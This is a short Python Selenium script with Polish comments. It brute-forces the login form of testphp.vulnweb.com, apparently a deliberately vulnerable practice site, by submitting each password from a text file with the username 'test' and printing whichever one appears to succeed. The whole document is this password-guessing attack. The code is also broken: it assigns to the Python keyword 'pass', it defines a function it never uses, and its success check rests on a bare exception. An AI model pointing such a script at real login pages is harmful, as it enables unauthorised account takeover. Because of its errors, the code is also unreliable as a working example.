from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support import expected_conditions as EC

driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.get("http://testphp.vulnweb.com/login.php")


"""Obłsuga listy hasłę"""

def read_list_from_file(filename):
    file_handler = open(filename + ".txt", "r")
    read_list = file_handler.readlines()
    file_handler.close()
    return read_list

"""Osługa strony"""

cssclick = "#content > div:nth-child(1) > form > table > tbody > tr:nth-child(3) > td > input[type=submit]"

def parameters(self, user_space, password_space):
    uname = user_space
    pass = password_space

    return user_space, password_space


"""Dane logowania"""

user_used = "test"
password_from_list = read_list_from_file("passw")



for password in password_from_list:
#"""Nazwa na stronie z CSS"""
    user_space = "uname"
    password_space = "pass"

    driver.find_element(by=By.NAME, value= user_space).send_keys(user_used)
    driver.find_element(by=By.NAME, value= password_space).send_keys(password)
    driver.find_element(by=By.CSS_SELECTOR, value=cssclick).click()
    try: #obsługa błedów
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, user_space)))
    except:
        print("Correct password is ==> " + password + " <==")



